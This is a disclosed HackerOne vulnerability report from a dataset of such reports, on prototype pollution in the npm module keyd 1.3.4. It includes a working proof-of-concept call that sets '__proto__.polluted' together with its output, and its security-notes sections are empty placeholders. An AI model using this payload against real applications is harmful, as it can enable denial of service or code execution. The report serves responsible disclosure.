---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '877515'
original_report_id: '877515'
title: '[keyd] Prototype pollution'
weakness: Modification of Assumed-Immutable Data (MAID)
team_handle: nodejs-ecosystem
created_at: '2020-05-18T19:58:29.357Z'
disclosed_at: '2020-09-14T10:51:47.788Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- modification-of-assumed-immutable-data-maid
---

# [keyd] Prototype pollution

## Metadata

- HackerOne Report ID: 877515
- Weakness: Modification of Assumed-Immutable Data (MAID)
- Program: nodejs-ecosystem
- Disclosed At: 2020-09-14T10:51:47.788Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `prototype pollution` vulnerability in `keyd` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `keyd`
**version:** `1.3.4`
**npm page:** `https://www.npmjs.com/package/keyd`

## Module Description

A small library for using and manipulating key paths in JavaScript.

## Module Stats

[71] weekly downloads

# Vulnerability

## Vulnerability Description

The `set` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `keyd` module:
    - `npm i keyd`

Set the `__proto__.polluted` property of an object:
```javascript

const keyd = require('keyd');
const obj = {};
console.log("Before : " + obj.polluted);
keyd({}).set('__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F833532}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
